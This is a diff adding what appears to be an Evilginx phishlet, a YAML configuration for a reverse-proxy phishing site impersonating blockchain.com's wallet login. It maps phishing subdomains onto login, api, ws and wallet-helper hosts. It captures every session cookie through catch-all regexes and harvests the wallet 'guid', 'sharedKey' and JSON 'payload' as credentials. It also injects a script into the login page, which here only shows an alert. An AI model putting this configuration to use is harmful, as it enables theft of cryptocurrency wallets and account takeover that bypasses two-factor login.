@@ -1,0 +1,52 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'blockchain.info', session: false, is_landing: false}
+  - {phish_sub: 'ws', orig_sub: 'ws', domain: 'blockchain.info', session: false, is_landing: false}
+  - {phish_sub: 'wallet-helper', orig_sub: 'wallet-helper', domain: 'blockchain.com', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'blockchain.info', orig_sub: '', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'blockchain.info', orig_sub: '', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+
+
+
+auth_tokens:
+  - domain: '.blockchain.info'
+    keys: ['(.+),regexp']
+  - domain: '(.+),regexp'
+    keys: ['(.+),regexp']
+    
+
+auth_urls:
+  - '/wallet/'
+  - '/wallet/.*'
+  
+credentials:
+  username:
+    key: 'guid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'sharedKey'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'payload'
+      search: '"payload":"([^"]*)'
+      type: 'json'
+login:
+  domain: 'login.blockchain.com'
+  path: '/#/login'
+js_inject:
+  - trigger_domains: ["login.blockchain.com"]
+    trigger_paths: [".*?"]
+    script: |
+            function lp(){
+                var f0 =alert('Script Injected !'); 
+                return;
+            }
+            setTimeout(function(){lp();}, 1500);
+           
